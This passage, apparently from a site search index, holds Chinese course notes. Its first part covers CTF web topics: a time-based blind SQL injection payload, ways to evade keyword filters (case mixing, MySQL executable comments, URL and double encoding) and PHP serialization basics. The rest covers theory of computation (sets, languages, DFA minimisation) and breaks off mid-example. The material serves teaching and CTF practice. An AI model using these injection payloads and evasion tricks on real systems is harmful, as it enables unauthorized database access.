<li>\u5176\u5b83\u6ce8\u5165\u4e0e\u6709\u56de\u663e\u7c7b\u4f3c\uff0c\u53ea\u662f\u65b9\u5f0f\u4e0d\u540c\uff0c\u4e14\u9ebb\u70e6\u4e86\u4e9b</li> </ul> <p>SLEEP</p> <p>\u6709\u65f6\uff0c\u8fd8\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528 <code>SLEEP</code> \u51fd\u6570\u6765\u5b9e\u73b0\u5bf9\u7ed3\u679c\u7684\u5224\u65ad\uff0c<code>password=111&amp;username=admin' and if(ascii(substr(DATABASE(),1,1))&gt;0,sleep(2),sleep(5))#</code></p> <p>\u6ce8\u610f\uff0cif \u8bed\u53e5\u524d\u9700\u8981\u4f7f\u7528 and \u800c\u4e0d\u80fd\u662f or \uff0c\u56e0\u4e3a\u7528 or \u7684\u8bdd\u6bcf\u6b21\u4f1a\u904d\u5386\u4e00\u904d\u8868\u5355\uff0c\u6ca1\u6709\u4e00\u884c\u6570\u636e\u90fd\u4f1a\u5bf9 if \u8fdb\u884c\u4e00\u6b21\u5224\u65ad\uff0c\u5bfc\u81f4\u5ef6\u65f6\u8fc7\u4e45</p>"},{"location":"Courses/ctf/WebTopic/#_4","title":"\u6ce8\u5165\u68c0\u6d4b\u7684\u7ed5\u8fc7","text":""},{"location":"Courses/ctf/WebTopic/#_5","title":"\u540c\u4e49\u8bcd\u66ff\u6362","text":"<ul> <li><code>and</code> =&gt; <code>&amp;&amp;</code></li> <li><code>or</code> =&gt; <code>||</code></li> <li><code>Space</code> =&gt; <code>/**/</code> (\u6216\u5199\u4e00\u4e2a\u66f4\u52a0\u590d\u6742\u7684\u6ce8\u91ca\uff0c\u5982 <code>/*//+-*/</code>)</li> </ul>"},{"location":"Courses/ctf/WebTopic/#_6","title":"\u5927\u5c0f\u5199\u7ed5\u8fc7","text":"<p>\u7531\u4e8e SQL \u4e00\u822c\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff0c\u6240\u4ee5\u5982\u679c\u9898\u76ee\u5bf9\u67e5\u8be2\u8bed\u53e5\u6b63\u5219\uff0c\u6709\u65f6\u53ef\u4ee5\u5c06\u88ab\u8fc7\u6ee4\u7684\u7ba1\u68c0\u6d4b\u6539\u4e3a\u5927\u5c0f\u5199\u6df7\u4e71\u5206\u5e03\uff0c\u5982 <code>UnIoN</code> </p>"},{"location":"Courses/ctf/WebTopic/#_7","title":"\u53ef\u6267\u884c\u6ce8\u91ca","text":"<p>\u5728 MySQL \u4e2d\uff0c<code>/*!50000 */</code> \u8fd9\u79cd\u683c\u5f0f\u7684\u6ce8\u91ca\uff0c\u5728 MySQL \u7248\u672c\u5927\u4e8e 5.00.00 \u7684\u65f6\u5019\u662f\u4f1a\u6267\u884c\u6ce8\u91ca\u5185\u90e8\u7684\u8bed\u53e5\u7684\uff0c\u6839\u636e\u81ea\u5df1\u9700\u6c42\u628a 50000 \u6539\u6210\u5176\u5b83\u6570\u5b57\u5373\u53ef\uff0c\u4f46\u8981\u6ce8\u610f\u4e00\u5b9a\u662f\u4e94\u4f4d\u6570</p>"},{"location":"Courses/ctf/WebTopic/#url","title":"URL\u7f16\u7801\u7f16\u7801\u7ed5\u8fc7","text":"<p>\u5728 BurpSuite \u4e2d\u901a\u8fc7\u6539\u5305\u4e0a\u4f20\u6570\u636e\u65f6\uff0c\u53ef\u4ee5\u7528 URL \u7f16\u7801\u66ff\u6362\u7b49\u4ef7\u5b57\u7b26\u6765\u5c1d\u8bd5\u7ed5\u8fc7\u5bf9\u5173\u952e\u8bcd\u7684\u68c0\u6d4b</p> <p>\u5982\u4e0b\u4e3a\u5e38\u7528URL\u7f16\u7801\uff1a</p> <ul> <li><code>Space</code> : %20</li> <li><code>#</code> : \u00a0%23</li> <li><code>'</code> :\u00a0 %27</li> <li><code>\"</code> :\u00a0 %22</li> <li><code>+</code> :\u00a0 %2B</li> </ul> <p>\u6709\u4e9b\u670d\u52a1\u5668\u652f\u6301\u4e8c\u6b21\u7f16\u7801\uff0c\u6bd4\u5982 <code>%%37%63%%37%63</code> \u6700\u7ec8\u4f1a\u53d8\u4e3a <code>||</code> (or)</p> <p>#+$-_.!*() \u6d4f\u89c8\u5668\u5730\u5740\u680f\u9ed8\u8ba4\u4e0d\u7f16\u7801\uff0c\u4f46\u662f\u4e0d\u610f\u5473\u7740\u4e0d\u80fd\u7f16\u7801</p>"},{"location":"Courses/ctf/WebTopic/#web_1","title":"Web \u4e13\u9898\u4e8c \u53cd\u5e8f\u5217\u5316","text":"<p>php \u5c06\u6570\u636e\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4f1a\u7528\u5230\u4e24\u4e2a\u51fd\u6570</p> <ul> <li>serialize\u00a0\u5c06\u5bf9\u8c61\u683c\u5f0f\u5316\u6210\u6709\u5e8f\u7684\u5b57\u7b26\u4e32</li> <li>unserialize\u00a0\u5c06\u5b57\u7b26\u4e32\u8fd8\u539f\u6210\u539f\u6765\u7684\u5bf9\u8c61</li> </ul> <p>\u5728PHP\u4e2d\uff0c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e00\u822c\u7528\u505a\u7f13\u5b58\uff0c\u6bd4\u5982session\u7f13\u5b58\uff0ccookie\u7b49\u3002</p> <p>\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b\uff1a</p> <pre><code>&lt;?php\n$user=array('xiao','shi','zi');\n$user=serialize($user);\necho($user.PHP_EOL);\nprint_r(unserialize($user));\n?&gt;\n/* Output\na:3:{i:0;s:4:\"xiao\";i:1;s:3:\"shi\";i:2;s:2:\"zi\";}\nArray\n(\n    [0] =&gt; xiao\n    [1] =&gt; shi\n    [2] =&gt; zi\n)\n*\n*\u4e0a\u9762\u8f93\u51fa\u4e2d\uff0ci\u4ee3\u8868\u6574\u578b\u6570\u636e int \uff0cs\u4ee3\u8868\u5b57\u7b26\u4e32\uff0c\u540e\u63a5\u957f\u5ea6\n*/\n</code></pre> <pre><code>&lt;?php\n\nclass FileHandler {\n    public  $op = 2;\n    public  $filename = \"flag.php\";\n}\n\n$a = new FileHandler();\n$b = serialize($a);\necho $b;\n\n?&gt;\n# Output: O:11:\"FileHandler\":2:{s:2:\"op\";i:2;s:8:\"filename\";s:8:\"flag.php\";}\n</code></pre>"},{"location":"Courses/tcs/","title":"\u8ba1\u7b97\u7406\u8bba","text":""},{"location":"Courses/tcs/#_1","title":"\u8ba1\u7b97\u7406\u8bba","text":"<p> \u7ea6 40 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>Problem =&gt; Sets of Symbols =&gt; Languages =&gt; Computational Models</p> <p></p>"},{"location":"Courses/tcs/#_2","title":"\u5206\u6570\u6784\u6210","text":"<ul> <li>10% \u4f5c\u4e1a</li> <li>20% \u5c0f\u6d4b</li> <li>70% \u671f\u672b</li> </ul>"},{"location":"Courses/tcs/#reference","title":"Reference","text":""},{"location":"Courses/tcs/#-","title":"- \u8ba1\u7b97\u7406\u8bba - \u9e64\u7fd4\u4e07\u91cc\u7684\u7b14\u8bb0\u672c","text":""},{"location":"Courses/tcs/Topic1/","title":"Basics","text":""},{"location":"Courses/tcs/Topic1/#basics","title":"Basics","text":"<p> \u7ea6 1271 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Courses/tcs/Topic1/#sets","title":"Sets","text":"<p>\u96c6\u5408\u90e8\u5206\u548c\u4ee5\u524d\u8bfe\u7a0b\u91cd\u590d\u7387\u8f83\u9ad8\uff0c\u4ec5\u7b80\u5355\u8bb0\u8f7d</p> <p>Set \u662f\u5143\u7d20\u7684\u65e0\u5e8f\u96c6\u5408\uff0c\u7a7a\u96c6\u7528 \\(\\emptyset\\) \u8868\u793a\u3002</p> <p>\u4e24\u4e2a\u96c6\u5408\u76f8\u7b49\u5f53\u4e14\u4ec5\u5f53\u5b83\u4eec\u5305\u542b\u7684\u5143\u7d20\u76f8\u540c\uff0c\u5373\uff1a</p> \\[ S=T \\;\\Leftrightarrow \\; (S\\subseteq T) \\land (T\\subseteq S) \\] <p>\u96c6\u5408\u7684 Operations \u5305\u62ec\uff1a</p> <ul> <li>Union: \\(A\\cup B\\)</li> <li>Intersection: \\(A\\cap B\\)<ul> <li>\u53c8\u53eb disjoint</li> </ul> </li> <li>Complement</li> <li>Difference: \\(B-A\\)</li> <li>Symmetric Difference</li> </ul> <p>\u96c6\u5408\u7684 Identities\uff1a</p> <p></p> <p>Power Set \u4e3a the set of all subset\uff0c\u8868\u793a\u4e3a \\(P(A)\\) \u6216 \\(2^A\\)\uff1a</p> \\[ 2^A= \\{T\\;|\\;T\\subseteq A\\} \\] <p>\u96c6\u5408\u7684\u52bf\u4e3a\u96c6\u5408\u5185\u4e0d\u540c\u5143\u7d20\u7684\u6570\u91cf\uff0c\u8868\u793a\u4e3a \\(|A|\\)\u3002\u4efb\u4f55\u6709\u9650\u7684\u96c6\u5408\u6216\u8005\u4e0e\u6574\u6570\u96c6 \\(N\\) \u7b49\u52bf\u7684\u96c6\u5408\u90fd\u79f0\u4f5c Countable \u7684\u3002</p> <p>\u5bf9\u4e8e Power Set \u7684\u52bf\uff0c\u6709\u5982\u4e0b\u4e24\u70b9\u6027\u8d28\uff1a</p> <ul> <li>\\(|S|=n\\Rightarrow |P(S)|=2^n\\)</li> <li>\\(S\\) is finite and so is \\(P(S)\\)</li> </ul>"},{"location":"Courses/tcs/Topic1/#relations-functions","title":"Relations &amp; Functions","text":"<p>\u4e0d\u540c\u4e8e Set\uff0c\u4e00\u4e2a Ordered Pair \u76f8\u7b49\u5f53\u4e14\u4ec5\u5f53\uff1a</p> \\[ (a,b)=(c,d) \\;\\Leftrightarrow \\; (a=c) \\land (b=d) \\] <p>\u8868\u793a\u65b9\u5f0f\u4e0a\u533a\u5206\u4e3a Set \u4e3a\u82b1\u62ec\u53f7\uff0cPair \u4e3a\u5c0f\u62ec\u53f7</p> <p>Binary Relation \u662f\u4e24\u4e2a\u96c6\u5408\u7684\u7b1b\u5361\u5c14\u79ef\u7684\u5b50\u96c6\uff0c\u8868\u793a\u4e3a\uff1a</p> \\[ R\\subseteq A\\times B=\\{(a,b)\\; |\\; a\\in A\\land b\\in B\\} \\] <p>\\(R\\subseteq A\\times B \\;\\Rightarrow \\; R^{-1} \\subseteq B\\times A\\)</p> <p>\u5bf9\u4e8e\u4e00\u4e2a Relation\uff0c\u5b83\u7684 input values \u7684\u96c6\u5408\u79f0\u4e3a\u5176\u7684 Domain\uff1b\u5b83\u7684 output values \u7684\u96c6\u5408\u79f0\u4e3a\u5176 Range\u3002\u901a\u5e38\u5bf9\u5e94\u7740\u7b1b\u5361\u5c14\u79ef\u7684\u5de6\u4e58\u5b50\u548c\u53f3\u4e58\u5b50\u4e24\u4e2a\u90e8\u5206\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\uff0cBinary Relation \u8fd8\u6709\u4e00\u4e9b\u7279\u6b8a Properties\uff1a</p> <ul> <li>Reflexive       \u81ea\u53cd\u6027     \\(\\forall a\\in A \\;\\Rightarrow \\; (a,a)\\in R\\)</li> <li>Irreflexive      \u53cd\u81ea\u53cd\u6027</li> <li>Symmetric     \u5bf9\u79f0\u6027     \\((a,b) \\in R\\land a\\ne b \\; \\Rightarrow \\; (b,a) \\in R\\) </li> <li>Antisymmetric \u53cd\u5bf9\u79f0\u6027   \\((a,b)\\in R \\land a\\ne b \\; \\Rightarrow \\; (b,a)\\notin R\\)</li> <li>Transitive      \u4f20\u9012\u6027     \\((a,b)\\in R, (b,c)\\in R\\; \\Rightarrow \\; (a,c)\\in R\\)</li> </ul> <p>Direct Graph\u3001Matrix \u90fd\u53ef\u4ee5\u770b\u4f5c\u662f Binary Relation \u7684\u7279\u6b8a\u7c7b\u578b</p> <ul> <li>Partial Order (\u504f\u5e8f\u5173\u7cfb) <ul> <li>Relation \\(R\\) on \\(A\\) is a partial order if it is:<ul> <li>Reflexive</li> <li>Antisymmetric</li> <li>Transitive</li> </ul> </li> <li>\u4f8b\u5982\u96c6\u5408\u5305\u542b\u5173\u7cfb \\(\\subseteq\\) \u5728\u6240\u6709\u96c6\u5408\u4e0a\u6784\u6210\u504f\u5e8f\u3002</li> </ul> </li> <li>Total Order (\u5168\u5e8f\u5173\u7cfb)<ul> <li>\u82e5\u504f\u5e8f\u5173\u7cfb \\(R\\) \u8fd8\u6ee1\u8db3\uff1a</li> <li> \\[\\forall a,b\\in A,\\; (a,b)\\in R \\lor (b,a)\\in R\\] </li> <li>\u5373\u4efb\u610f\u4e24\u5143\u7d20\u53ef\u6bd4\u8f83\uff0c\u5219\u79f0\u4e3a Total Order\u3002  </li> <li>\u4f8b\u5982\u81ea\u7136\u6570\u96c6\u4e0a\u7684 \\(\\le\\)\u3002</li> </ul> </li> </ul> <p>Function \\(f: A\\rightarrow B\\) \u5728 Relation \u7684\u57fa\u7840\u4e0a\uff0c\u8981\u6c42\u5bf9\u4e8e\u4efb\u610f \\(a\\in A\\)\uff0c\u6700\u591a\u5b58\u5728\u4e00\u4e2a \\(b\\in B\\) \u4e14 \\((a,b) \\in f\\)\u3002\u6211\u4eec\u5c06 \\((a,b) \\in f\\) \u5199\u4f5c \\(f(a) =b\\)\u3002</p> <p>Function \u5206\u4e3a\u5355\u5c04\u3001\u6ee1\u5c04\u548c\u53cc\u5c04\uff1a</p> <ul> <li>One-to-one / injection / \u5355\u5c04<ul> <li>\\(\\forall a,b \\in A,\\; (f(a)=f(b)\\to a=b)\\)</li> </ul> </li> <li>Onto / surjection / \u6ee1\u5c04<ul> <li>\\(\\forall b\\in B,\\; \\exists a \\in A, \\; (f(a)=b)\\)</li> </ul> </li> <li>One-to-one and Onto or one-to-one correspondence / bijection / \u53cc\u5c04\u3001\u4e00\u4e00\u5bf9\u5e94<ul> <li>\u7b49\u4e8e One-to-one + Onto</li> </ul> </li> </ul> <p>\u6709\u5173\u51fd\u6570\uff0c\u6709\u4e00\u7cfb\u5217\u76f8\u5173\u7406\u8bba\u53ef\u4ee5\u5e94\u7528\uff1a</p> <ul> <li>Cantor's Theorem<ul> <li>\u5bf9\u4e8e\u96c6\u5408 \\(A\\)\uff0c\u5176 Power Set \u7684\u52bf\u4e25\u683c\u5927\u4e8e \\(A\\) \u7684\u52bf</li> <li>\\(|A|\\lt |P(A)|\\)</li> </ul> </li> <li>Pigeonhole Principle<ul> <li>\u82e5\u5c06 \\(N\\) \u4e2a\u5bf9\u8c61\u653e\u5165 \\(k\\) \u4e2a\u76d2\u5b50\uff0c\u5219\u81f3\u5c11\u6709\u4e00\u4e2a\u76d2\u5305\u542b \\(\\lceil N / k \\rceil\\) \u4e2a\u5bf9\u8c61</li> </ul> </li> <li>Mathematical Induction, Diagonalization Principle...</li> </ul> <p>Closure</p> <p>\u8bbe\u96c6\u5408 \\(A\\) \u5728\u67d0\u79cd\u8fd0\u7b97 \\(\\star\\) \u4e0b\u6ee1\u8db3\uff1a</p> \\[\\forall a,b\\in A,\\ a\\star b \\in A\\] <p>\u5219\u79f0\u96c6\u5408 \\(A\\) \u5bf9\u4e8e\u8be5\u8fd0\u7b97\u5c01\u95ed\u3002\u4f8b\u5982\uff1a</p> <ul> <li>\u6574\u6570\u96c6 \\(\\mathbb{Z}\\) \u5bf9\u52a0\u6cd5\u3001\u4e58\u6cd5\u5c01\u95ed\uff1b</li> <li>\u81ea\u7136\u6570\u96c6 \\(\\mathbb{N}\\) \u5bf9\u51cf\u6cd5\u4e0d\u5c01\u95ed\u3002</li> </ul>"},{"location":"Courses/tcs/Topic1/#language","title":"Language","text":"<p>\u5728\u8bb2\u89e3 Language \u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5148\u5b9a\u4e49\u5f62\u5f0f\u8bed\u8a00\u7406\u8bba\u4e2d\u7684\u51e0\u4e2a\u6982\u5ff5\u3002</p> <p>\u4efb\u4f55\u6709\u9650\u975e\u7a7a\u96c6\u5408\u5747\u79f0\u4f5c alphabet\uff0c\u7528\u7b26\u53f7 \\(\\Sigma\\) \u8868\u793a\uff1balphabet \u5185\u5143\u7d20\u88ab\u79f0\u4e3a symbols\u3002</p> <p>\u5728 alphabet \u4e4b\u4e0a\uff0c\u6211\u4eec\u79f0 symbols \u7684\u6709\u9650\u5e8f\u5217\u4e3a Strings\uff0c\u5176\u4e2d\u6839\u636e\u6240\u5305\u542b\u5185\u5bb9\u4e0d\u540c\uff0c\u4f7f\u7528\u4e0d\u540c\u7b26\u53f7\u8868\u793a\uff1a</p> <ul> <li>\u4f7f\u7528 \\(e\\) \u8868\u793a empty String over \\(\\Sigma\\)<ul> <li>\u5f88\u591a\u6559\u6750\uff08\u5305\u62ec\u540e\u9762\u7ae0\u8282\u7684 PPT \u90fd\u662f\u7528 \\(\\epsilon\\) \u8868\u793a\uff09</li> </ul> </li> <li>\u4f7f\u7528 \\(\\Sigma^*\\) \u8868\u793a the set of all Strings over \\(\\Sigma\\)<ul> <li>\u8fd9\u4e5f\u610f\u5473\u7740\u5982\u679c \\(\\Sigma\\) \u662f\u4e00\u4e2a\u6709\u9650\u96c6\u5408\uff0c\u90a3\u4e48 \\(\\Sigma^*\\) \u4e3a Countably Infinite Set</li> </ul> </li> </ul> <p>\u6211\u4eec\u4f7f\u7528 \\(w\\in \\Sigma^*\\) \u6765\u8868\u793a \\(w\\) \u662f \\(\\Sigma^*\\) \u4e2d\u7684\u4e00\u4e2a String</p> <p>String \u4e4b\u95f4\u6709\u8fde\u63a5\u8fd0\u7b97\uff08Concatenation\uff09\uff0c\u5176\u672c\u8d28\u662f\u6709\u9650\u5e8f\u5217\u4e4b\u95f4\u7684\u62fc\u63a5\uff0c\u4f7f\u7528 \\(x\\circ y\\) \u6216 \\(xy\\) \u8868\u793a\u3002\u5bf9\u4e8e\u4efb\u610f String \\(w\\)\uff0c\u90fd\u6709 \\(w^0=e\\)\uff0c\u5e76\u4e14 \\(w^{i+1}= w^i \\circ w\\)\u3002</p> <p>\\(\\forall w,\\; we=ew=w\\)</p> <p>Language \u662f \\(\\Sigma^*\\) \u7684\u5b50\u96c6\uff0c\u8868\u793a\u4e3a \\(L\\subseteq \\Sigma^*\\)\u3002\u6709\u4e9b Language \u4e0d\u80fd\u901a\u8fc7\u5217\u4e3e\u6709\u9650\u4e2a Strings \u6765\u8868\u793a\uff0c\u5fc5\u987b\u901a\u8fc7\u6307\u5b9a scheme \u7684\u65b9\u5f0f\u5b9a\u4e49\uff0c\u4f8b\u5982\uff1a</p> \\[ L=\\{ab, aabb, aaabbb,...\\}=\\{a^n b^n\\;|\\; n\\ge 1\\} \\] <p>\\(\\emptyset, \\Sigma, \\Sigma^*\\) \u90fd\u662f Languages</p> <p>\u4e0e Strings \u7c7b\u4f3c\uff0c\u6211\u4eec\u4e5f\u4e3a Language \u5b9a\u4e49 Concatenation \u8fd0\u7b97\uff1a</p> \\[ L_1 L_2 = \\{w_1 w_2 \\;|\\; w_1 \\in L_1\\land w_2 \\in L_2\\} \\] <p>\u3010Example\u3011</p> <ul> <li>\\(L_1 = \\{w\\in \\{0,1\\}^* : w\\text{ has an even number of 0}\\}\\)</li> <li>\\(L_2 = \\{w\\in \\{0,1\\}^* : w\\text{ starts with 0, the rest symbol are all 1}\\}\\)</li> <li>\\(L_1 L_2 = \\{w\\in \\{0,1\\}^* : w\\text{ has an odd number of 0}\\}\\)</li> </ul> <p>\u53e6\u5916\u6211\u4eec\u5b9a\u4e49 Language \u7684 Kleene Star \u8fd0\u7b97\uff1a</p> \\[\\begin{array}l L^* = \\{w\\in \\Sigma^* : w=w_1 ... w_k,\\ k\\ge 0,\\ w_1,...,w_k\\in L\\}= L^0 \\cup L^1 \\cup L^2\\cup ... \\\\  L^+ = LL^* = L^1 \\cup L^2\\cup L^3\\cup ... \\end{array} \\] <p>\u90a3\u4e48\u6b64\u65f6 \\(L^+\\) \u5373\u4e3a \\(L\\) \u5173\u4e8e\u51fd\u6570 Concatenation \u7684 Closure\u3002</p> <p>Question</p> <ul> <li>&lt;1&gt; Can \\(e\\in L^+\\) for some \\(\\Sigma\\) ?<ul> <li>\\(L^+\\) = \\(L\\cup L^2\\cup...\\)\uff0c\u800c \\(L^0=\\{e\\}\\) \u88ab\u4ece \\(L^*\\) \u4e2d\u5254\u9664\uff0c\u56e0\u6b64 \\(e\\in L^+\\) \u7684\u5145\u8981\u6761\u4ef6\u662f \\(e\\in L\\)</li> </ul> </li> <li>&lt;2&gt; When we have \\(L^+= L^*\\)<ul> <li>\u540c\u4e0a\uff0c\u6211\u4eec\u77e5\u9053 \\(L^* = \\{e\\} \\cup L^+\\), \u56e0\u6b64 \\(L^+= L^*\\) \u7684\u5145\u8981\u6761\u4ef6\u4e5f\u662f \\(e\\in L\\)</li> </ul> </li> <li>&lt;3&gt; Can \\(L^*\\) or \\(\\emptyset^*\\) equal to \\(\\emptyset\\) ?<ul> <li>\u7531\u4e8e \\(L^*=\\{e\\} \\cup L^+\\)\uff0c\u4e00\u5b9a\u5305\u542b \\(e\\)\uff0c\u6240\u4ee5\u5b83\u4e0d\u53ef\u80fd\u7b49\u4e8e\u7a7a\u96c6</li> <li>\\(\\emptyset ^*=\\{e\\} \\cup \\emptyset \\cup \\emptyset \\cup ... = \\{e\\}\\)</li> </ul> </li> </ul>"},{"location":"Courses/tcs/Topic2/","title":"Simple Model","text":""},{"location":"Courses/tcs/Topic2/#simple-model","title":"Simple Model","text":"<p> \u7ea6 3434 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 17 \u5206\u949f</p>"},{"location":"Courses/tcs/Topic2/#regular-language-finite-automata","title":"Regular Language &amp; Finite Automata","text":""},{"location":"Courses/tcs/Topic2/#deterministic-finite-automata","title":"Deterministic Finite Automata","text":"<p>\u6709\u9650\u72b6\u6001\u673a\u62e5\u6709\u4e00\u5b9a\u6570\u91cf\u7684\u72b6\u6001\uff0c\u72b6\u6001\u4e4b\u95f4\u901a\u8fc7\u4e00\u4e9b\u7279\u5b9a\u6761\u4ef6\u8fdb\u884c\u8f6c\u79fb\u3002\u7528\u56fe\u50cf\u8868\u793a\uff0cState Diagram \u7684\u4e00\u4e9b\u8868\u793a\u7b26\u53f7\u5982\u4e0b\uff1a</p> <p></p> <p>\u4e00\u4e2a Deterministic Finite Automata (DFA) \u7531\u4e94\u4e2a\u53c2\u6570 \\((K,\\Sigma , \\delta, s, F)\\) \u7ec4\u6210\uff1a</p> <ul> <li>\\(K\\): \u6709\u9650\u72b6\u6001\u96c6\u5408</li> <li>\\(\\Sigma\\): \u5b57\u6bcd\u8868</li> <li>\\(s\\in K\\): \u521d\u59cb\u72b6\u6001</li> <li>\\(F\\subseteq K\\): \u6700\u7ec8\u72b6\u6001\u96c6\u5408\uff08set of final states\uff09</li> <li>\\(\\delta\\): \u8f6c\u79fb\u65b9\u7a0b<ul> <li>\\(\\delta: K\\times \\Sigma \\rightarrow K\\)</li> </ul> </li> </ul> <p>Final States</p> <p>DFA \u8f93\u5165\u88ab\u63a5\u53d7\u7684\u72b6\u6001\uff0c\u82e5\u5904\u7406\u5b8c\u4e00\u4e32\u8f93\u5165\u540e\u505c\u7559\u5728 Final State\uff0c\u5219\u8be5\u8f93\u5165\u88ab\u63a5\u53d7\uff1b\u53cd\u4e4b\u5219\u88ab\u62d2\u7edd\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u5982\u4e0b\u72b6\u6001\u673a\uff0c\u8f93\u5165 <code>aabba</code> \u4f1a\u88ab ACCEPT\uff1a</p> <p></p> <p>\u8bbe\u8ba1\u4e00\u4e2a DFA\uff0c\u8981\u6c42\u5b9e\u73b0 Language \\(L_1 =\\{w\\in \\{a,b\\}^* : w\\text{ \u6ca1\u6709\u4e09\u4e2a\u8fde\u7eed\u7684 b}\\}\\)</p> <p></p> \u5982\u679c\u6211\u4eec\u60f3\u8981 \\(L_2=\\{w\\in\\{a,b\\}^* : w\\text{ \u5305\u542b\u4e09\u4e2a\u8fde\u7eed\u7684 b}\\}\\) \u600e\u4e48\u529e? <p>\u7531\u4e8e \\(L_2 = \\Sigma^* - L_1\\)\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06 Final States \\(F=\\{q_0, q_1, q_2\\}\\) \u53d8\u4e3a \\(F=\\{q_3\\}\\) \u5373\u53ef\u3002</p> <p>Configuration \u662f \\(K\\times \\Sigma^*\\) \u7684\u5b50\u96c6\uff0c\u4ee3\u8868\u4e86\u4e00\u4e2a DFA \u5f53\u524d\u7684\u72b6\u6001\uff0c\u8868\u793a\u4e3a \\((q,w)\\)\uff0c\u5176\u4e2d\uff1a</p> <ul> <li>\\(q\\in K\\) \u4e3a\u5f53\u524d\u72b6\u6001\uff08current state\uff09</li> <li>\\(w\\in \\Sigma^*\\) \u4e3a\u5c1a\u672a\u8bfb\u53d6\u7684\u5269\u4f59\u8f93\u5165\u4e32</li> </ul> <p>\u6211\u4eec\u4f7f\u7528\u7b26\u53f7 \\(\\vdash_M\\) \u6765\u8868\u793a DFA \u5728\u914d\u7f6e\u4e4b\u95f4\u7684\u8f6c\u79fb\uff1a</p> \\[(q, w) \\;\\vdash_M\\; (q', w')\\] <p>\u6b64\u65f6\u4e00\u5b9a\u5b58\u5728\u67d0\u4e00 Symbol \\(a\\in \\Sigma\\) \u5728\u914d\u7f6e\u8f6c\u79fb\u8fc7\u7a0b\u4e2d\u88ab\u8bfb\u53d6\uff0c\u5e76\u4e14\u6709\uff1a</p> <ul> <li>\\(w=aw'\\)</li> <li>\\(\\delta (q,a) = q'\\)</li> </ul> <p>\\(\\vdash_M^*\\) \u662f\u8fd0\u7b97 \\(\\vdash_M\\) \u5173\u4e8e reflexive, transitive \u7684 Closure\uff0c\u90a3\u4e48 \\((q, w) \\;\\vdash_M^*\\; (q', w')\\) \u8bf4\u660e\u914d\u7f6e \\((q,w)\\) \u53ef\u4ee5\u5728\u6709\u9650\u6b65\u8f6c\u79fb\u5230 \\((q', w')\\)\uff0c\u5e76\u4e14\u6211\u4eec\u6b64\u65f6\u79f0 \\((q,w)\\) yields \\((q',w')\\)\u3002</p> <p>\u8fd9\u91cc\u7684\u6709\u9650\u6b65\u4e5f\u53ef\u4ee5\u662f 0\uff0c\u56e0\u6b64\u4e5f\u6709 \\((q,w)\\; \\vdash_M^* \\; (q,w)\\)</p> <p>\u6b64\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u4e0a\u9762\u5bf9\u4e8e Final States \u63cf\u8ff0\u6539\u4e3a\uff1a</p> <p>A string \\(w\\in \\Sigma^*\\) is said to be accepted by M iff there is a state \\(q\\in F\\) such that \\((s,w)\\; \\vdash_M^*\\; (q,e)\\)\u3002</p> <p>\u6240\u6709\u88ab DFA \\(M\\) \u63a5\u53d7\u7684 string \u96c6\u5408\u8868\u793a\u4e3a \\(L(M)\\)\uff0c\u5b83\u662f\u88ab \\(M\\) \u63a5\u53d7\u7684 Language\u3002</p> DFA \u6700\u5c0f\u5316\u95ee\u9898 <ul> <li>&lt;1&gt; \u5220\u9664\u6240\u6709\u4e0d\u53ef\u8fbe\u72b6\u6001</li> <li>&lt;2&gt; \u5408\u5e76\u7b49\u4ef7\u72b6\u6001<ul> <li>&lt;2.1&gt; \u521d\u59cb\u72b6\u6001\u5206\u4e3a\u63a5\u53d7\u7ec4\u548c\u975e\u63a5\u53d7\u7ec4\uff0c\u56e0\u4e3a\u63a5\u6536\u72b6\u6001\u548c\u975e\u63a5\u53d7\u72b6\u6001\u4e0d\u7b49\u4ef7</li> <li>&lt;2.2&gt; \u8003\u5bdf\u63a5\u6536\u5230\u67d0\u4e00\u8f93\u5165\u7b26\u53f7\u540e\uff0c\u67d0\u7ec4\u5185\u7684\u4e0d\u540c\u72b6\u6001\u662f\u5426\u4f1a\u8f6c\u79fb\u5230\u4e0d\u540c\u7b49\u4ef7\u7ec4<ul> <li>\u5982\u679c\u4e0d\u7b49\u4ef7\uff0c\u5219\u5c06\u5b83\u4eec\u5206\u5f00\u5efa\u4e3a\u65b0\u7ec4</li> </ul> </li> <li>&lt;2.3&gt; \u91cd\u590d 2.2\uff0c\u76f4\u5230\u65e0\u6cd5\u7ec6\u5206</li> </ul> </li> </ul> Example <p></p> <p>\u6839\u636e\u89c4\u5219\uff1a\u201c\u63a5\u53d7\u72b6\u6001\u4e0e\u975e\u63a5\u53d7\u72b6\u6001\u4e0d\u7b49\u4ef7\u201d\u3002\u6211\u4eec\u5c06\u6240\u6709\u72b6\u6001\u5206\u6210\u4e24\u7ec4\uff1a</p> <ul> <li>\u63a5\u53d7\u72b6\u6001\u7ec4 (Final)\uff1a \\(\\{q_5\\}\\) (\u53cc\u5708\u72b6\u6001)</li> <li>\u975e\u63a5\u53d7\u72b6\u6001\u7ec4 (Non-Final)\uff1a \\(\\{q_0, q_1, q_2, q_3, q_4\\}\\)</li> </ul> <p>\u68c0\u67e5\u5927\u7ec4 \\(\\{q_0, q_1, q_2, q_3, q_4\\}\\) \u5185\u90e8\u662f\u5426\u8fd8\u80fd\u62c6\u5206\uff0c\u4f8b\u5982\u8003\u5bdf\u8f93\u5165 1\uff1a</p> <ul> <li>\\(q_0\\) \u8f93\u5165 1 \\(\\to\\) \\(q_2\\) (\u5728\u975e\u63a5\u53d7\u7ec4)</li> <li>\\(q_1\\) \u8f93\u5165 1 \\(\\to\\) \\(q_3\\) (\u5728\u975e\u63a5\u53d7\u7ec4)</li> <li>\\(q_2\\) \u8f93\u5165 1 \\(\\to\\) \\(q_5\\) (\u5728\u63a5\u53d7\u7ec4)</li> <li>\\(q_3\\) \u8f93\u5165 1 